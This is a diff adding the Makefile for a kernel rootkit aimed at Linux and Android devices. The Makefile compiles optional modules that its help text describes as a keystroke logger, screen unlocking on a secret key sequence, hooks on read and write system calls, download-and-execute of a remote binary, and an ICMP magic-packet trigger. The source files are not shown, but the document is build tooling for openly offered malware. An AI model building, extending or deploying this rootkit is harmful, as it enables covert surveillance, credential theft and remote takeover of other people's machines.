@@ -1,0 +1,97 @@
+obj-m += rootkit.o
+rootkit-objs := main.o util.o module.o
+
+ifdef KEYLOGGER
+	rootkit-objs += keylogger.o
+	MODULES += -D_CONFIG_KEYLOGGER_
+ifdef UNLOCK
+	MODULES += -D_CONFIG_UNLOCK_
+endif
+ifdef LOGFILE
+	MODULES += -D_CONFIG_LOGFILE_
+endif
+endif
+
+ifdef KILL 
+	rootkit-objs += kill.o
+	MODULES += -D_CONFIG_KILL_
+endif
+
+ifdef HOOKRW
+	rootkit-objs += hookrw.o
+	MODULES += -D_CONFIG_HOOKRW_
+endif
+
+ifdef DLEXEC
+	rootkit-objs += dlexec.o
+	MODULES += -D_CONFIG_DLEXEC_
+ifdef ICMP
+	rootkit-objs += icmp.o
+	MODULES += -D_CONFIG_ICMP_
+endif
+endif
+
+default:
+	@echo "To build rootkit:"
+	@echo "  make TARGET KDIR=/path/to/kernel"
+	@echo
+	@echo "To build with additional modules:"
+	@echo "  make TARGET KDIR=/path/to/kernel MODULE1=y MODULE2=y..."
+	@echo
+	@echo "To cross-compile:"
+	@echo "  make TARGET CROSS_COMPILE=arm-linux-androideabi- KDIR=/path/to/kernel"
+	@echo
+	@echo "To clean the build dir:"
+	@echo "  make clean KDIR=/path/to/kernel"
+	@echo
+	@echo "Supported targets:"
+	@echo "linux-mips    	Linux, mips"
+	@echo "linux-x86    	Linux, x86"
+	@echo "linux-x86_64 	Linux, x86_64"
+	@echo "android-arm  	Android Linux, ARM"
+	@echo
+	@echo "Supported modules:"
+	@echo "KEYLOGGER    Monitor keystrokes"
+	@echo "  UNLOCK     Unlock the screen upon given key sequence"
+	@echo "  LOGFILE    Log keystrokes to a local file"
+	@echo "HOOKRW       Hook sys_read and sys_write"
+	@echo "DLEXEC       Download & execute a binary upon event"
+	@echo "  ICMP       Monitor inbound ICMP for magic packet"
+
+linux-mips:
+ifndef KDIR
+	@echo "Must provide KDIR!"
+	@exit 1
+endif
+	$(MAKE) EXTRA_CFLAGS="-D_CONFIG_MIPS_  ${MODULES}" -C $(KDIR) M=$(PWD) modules
+
+linux-x86:
+ifndef KDIR
+	@echo "Must provide KDIR!"
+	@exit 1
+endif
+	$(MAKE) ARCH=x86 EXTRA_CFLAGS="-D_CONFIG_X86_ ${MODULES}" -C $(KDIR) M=$(PWD) modules
+
+all:
+	$(MAKE) ARCH=x86_64 EXTRA_CFLAGS="-D_CONFIG_X86_64_ ${MODULES}" -C $(KDIR) M=$(PWD) modules
+
+linux-x86_64:
+ifndef KDIR
+	@echo "Must provide KDIR!"
+	@exit 1
+endif
+	$(MAKE) ARCH=x86_64 EXTRA_CFLAGS="-D_CONFIG_X86_64_ ${MODULES}" -C $(KDIR) M=$(PWD) modules
+
+android-arm:
+ifndef KDIR
+	@echo "Must provide KDIR!"
+	@exit 1
+endif
+	$(MAKE) ARCH=arm EXTRA_CFLAGS="-D_CONFIG_ARM_ -fno-pic ${MODULES}" -C $(KDIR) M=$(PWD) modules
+
+clean:
+ifndef KDIR
+	@echo "Must provide KDIR!"
+	@exit 1
+endif
+	$(MAKE) -C $(KDIR) M=$(PWD) clean
